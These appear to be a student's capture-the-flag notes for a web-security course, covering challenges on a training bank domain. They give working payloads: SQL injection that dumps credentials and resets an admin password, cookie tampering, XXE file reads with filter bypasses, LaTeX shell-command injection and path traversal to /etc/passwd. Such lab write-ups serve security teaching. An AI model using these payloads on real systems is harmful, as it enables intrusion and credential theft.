# Week 4-5

pay-portal subdomain

- `" OR 1=1-- `
- COMP6443{SQLilsPowerful}

support subdomain

- Noticed new notes had the format of /raw/{base58encode(customer_id:ticket_id)}
  - Python brute force: flag found at 1125:4
  - Another flag found at 9447:1

bigapp subdomain

Objectives:

- Login
  - `' or 1=1;-- ` for username with any valid password
  - Flag can be found in response header for login.html upon successful login
- Make the banking product list return more than it should
  - Injecting `') OR 1=1) UNION SELECT 1, table_name, 3, column_name, 5, 6 FROM information_schema.columns-- )` allowed me to access additional rows
  - Inspecting the network and examining the API called, the flag appears in the response header if more than 20 (expected) rows are returned
- Sort the banking products
  - ORDER BY ID ASC
  - Inject: `') OR 1=1) ORDER BY id ASC-- )`
  - Note: union select * from bproducts doesn't give flag :(
- Find alternate means to login other than the obvious (no SQLi required)
  - /login.html form sends a post request with susername and spassword
  - Can also login by sending a GET request to /login.html?susername=admin%40quoccabank.com&spassword=Admin%40123
- Become admin without logging into admin
  - Cookie (edit base_encoded email:user to email:admin)
- Login to admin using its actual password without online brute-forcing
  - Inject: `') OR 1=1) UNION SELECT 1, email, 3, password, 4, 5 FROM users-- )` to get all credentials
  - Password hashed - rainbow table (MD5): admin@quoccabank.com with Admin@123
  - Flag obtained - similar method to Login (1)
- Create duplicate user with existing user's email
  - Intercept registration of existing user's email - replace payload with url-encoded `Chris.Hall@lazy.com' OR 1=1-- )` - flag can be found in response header





- Analyse network: https://bigapp.quoccabank.com/api/v1/bproducts?q={query}
- Non-url encoded q=' or '1' = '1'-- : returns the syntax in error message
  - OR pname LIKE '%' or '1' = '1'--%') AND bu IS NOT NULL)
  - So MySQL query is something like SELECT id, pname, code, category, bu, owner FROM bproducts WHERE .. OR pname LIKE '%{}%') AND bu IS NOT NULL)
  - We want something like: OR pname LIKE '%') OR 1=1
  - `')) OR 1=1-- )` last bracket makes sure trailing space gets registered

signin subdomain

- Reset -> enter email to get password (can only use zID@quoccabank.com which you own - even though you can change your email to admin@quoccabank.com through Burp Suite)

- Login -> displays IP details (also makes a request to qdns subdomain)

- Navigate to qdns subdomain -> override by registering IP address (from signin) with another domain (TXT record is vulnerable to SQLi)

- Injecting a magic payload into the TXT record, an error is produced when sending a password reset request through the form (before the generated password is issued)

- Probing with a record of `' or 1=1-- )` returns an error "expected 1 arguments, got 4". Further probing with an invalid payload of `' foo --)` reveals the rest of the original query, which expect three more arguments. Examining the behaviour of qdns settings and txt record updates only having an effect when a new reset request is sent, I was able to guess and construct the SQL query used to process the request and update the password: 

  ```sql
  UPDATE users password=?, reset_details=?, last_reset=?, reset_actor=? where email=?;
  ```

- Since the invalid payload revealed that I was injecting into the reset_details parameter, I was able to inject the payload `', last_reset=?, reset_actor=? where email=? or email='admin@quoccabank.com' -- )` to reset my account as well as the admin account to have the same password, and logging into the admin account displays the flag.

- Note: resetting the admin may not always be ideal, so it might be better to just retrieve the admin password instead

  - `', last_reset=concat(?, (select password from users where email='admin@quoccabank.com')), reset_actor=? where email=?-- )` doesn't work since MySQL doesn't let you access the table being updated
  - `', last_reset=concat(?, (select password from (select * from users) as temp where email='admin@quoccabank.com')), reset_actor=? where email=?-- )` displays the admin password which can be logged into

v1.feedifier subdomain

- Source code: flag hidden in /flag_1e023d780b687b2b3be9b3a5b65a4a23
- Navigating to this returns error 404 - most likely file to be accessed on server
- GitHub Gist to host malicious xml file - modify existing RSS template such as https://blog.quoccabank.com/?feed=rss2
  - Add `<!DOCTYPE foo [<!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "file:///flag_1e023d780b687b2b3be9b3a5b65a4a23">]>`
  - Overwrite one of the link fields for a RSS item with `&xxe;` - other fields have output length limited
  - The link will now be the flag

v2.feedifier subdomain

- Using the same method for the new flag location (from source code) returns an error: bad word detected

- From experimenting, this bad word is `file://`

- Can't concatenate XML entities or use `&#47;` instead of a `/`, or use different encodings -> potentially load another XXE entity

- Main xml:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY % load SYSTEM "external dtd (different from current domain)"> %load;]>
  <rss version="2.0">
  <channel>
    <item>
    	<title>&payload;</title>
      <link>&payload;</link>
    	<description>&payload;</description>
    </item>
  </channel>
  </rss>
  ```

- External dtd:

  ```xml-dtd
  <!ENTITY payload SYSTEM "file:///flag_ef06b68429bb6010ab389ebbe34cb757">
  ```

v3.feedifier subdomain

- Bypass multiple layers of regex filtering

- Same main xml

- External dtd:

  ```xml-dtd
  <!ENTITY % p1 "file">
  <!ENTITY % p2 ":///fl">
  <!ENTITY % p3 "ag_986133c07ed52690d698ab47a2fd1aef">
  <!ENTITY % pload "<!ENTITY payload SYSTEM '%p1;%p2;%p3;'>">
  %pload;
  ```

  https://youtu.be/gjm6VHZa_8s

  https://github.com/Angus-C-git/SecSheets/blob/master/Web/Injection/XXE/XXE.md

v4.feedifier subdomain



letters subdomain

- Flag 1
  - LaTex to PDF /flag file in source code
  - inject LaTeX: `\input{/flag}` to open /flag file to get flag
- Flag 2
  - /key file in source code: similar approach as above to get the key: imagineUsingW0rd
  - key signs the debug option
  - Payload: `\input{|"ls / | base64"}`
  - then `\input{|"cat /admin_539f98bf-9a52-4bc0-bf34-1ffaba10997c.pdf | base64"}`
  - then reading the base64 decoded bytes as a pdf to get the flag  [Hacking with LaTeX](https://0day.work/hacking-with-latex/)

bfd subdomain

- https://github.com/ajyoon/systemf/blob/master/examples/http/server.bf#L241 mentions treating the address as a relative file path
- Intercept GET request with Burp Suite, make request to `/../../../../etc/passwd` or `//etc/passwd` to get the flag COMP6443{BRAAAAAINS}

gcc subdomain

- Checks uploaded file ends with .c
- Copies it to /tmp/php?????.c: `cp/mv filename /tmp/php?????.c`
- Runs gcc to compile it: `gcc /tmp/php?????.c`
- Binary name strips .c
- Binary uploaded with UNIXTIMESTAMP_binaryname



Compiler errors are displayed - `#include "/etc/passwd"` and  `#include "/var/www/html/index.php"` - first line displayed

However, `#include "/var/www/html/flag.php"` displays error that file/directory does not exist

GET request to /upload.php - undefined index: fileToUpload in /quocca-gcc/upload.php





#include any uploaded file

Ideas:

- Code that is both valid PHP and C -> filename something.php.c -> download link is a .php endpoint which can be executed





All Python Scripts which use Requests to connect to *.quoccabank.com have the following header

```python
import os
import re
import sys
import time
import requests
from OpenSSL import crypto

''' Adapted from Brendan Nyholm '''
# .p12 certificate
p12_path = os.path.expanduser(r'~/Downloads/6443.p12')
p12_password = '' # TODO
# create pem file from p12
p12 = crypto.load_pkcs12(open(p12_path, 'rb').read(), p12_password.encode())
# PEM formatted private key
key_path = os.path.expanduser(r'~/myKey.key')
k = crypto.dump_privatekey(crypto.FILETYPE_PEM, p12.get_privatekey())
with open(key_path, 'wb') as f_key:
    f_key.write(k)
# PEM formatted certificate
cert_path = os.path.expanduser(r'~/myCert.crt')
c = crypto.dump_certificate(crypto.FILETYPE_PEM, p12.get_certificate())
with open(cert_path, 'wb') as f_cert:
    f_cert.write(c)
lientcert = (cert_path, key_path)
```

















